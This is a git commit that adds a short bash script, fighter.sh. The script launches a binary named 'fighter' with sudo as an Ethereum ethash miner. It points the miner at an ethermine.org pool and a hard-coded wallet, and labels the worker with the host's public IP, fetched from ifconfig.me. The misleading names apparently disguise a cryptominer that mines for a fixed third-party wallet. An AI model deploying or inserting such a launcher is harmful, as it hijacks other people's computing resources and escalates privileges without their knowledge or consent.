d166265b8c4d302215b272df1dbdd33bd664bfba
labilabi44 <75320103+labilabi44@users.noreply.github.com>
2021-02-16 13:14:28 +0700

    Create fighter.sh

---
+++ fighter.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=ethproxy+tcp://asia1.ethermine.org:4444
+WALLET=0xe059139a081151e631591d6d30fdd150120fcd05
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-bmb
+
+cd "$(dirname "$0")"
+
+chmod +x ./fighter && sudo ./fighter -a ethash -o $POOL -u $WALLET.$WORKER $@
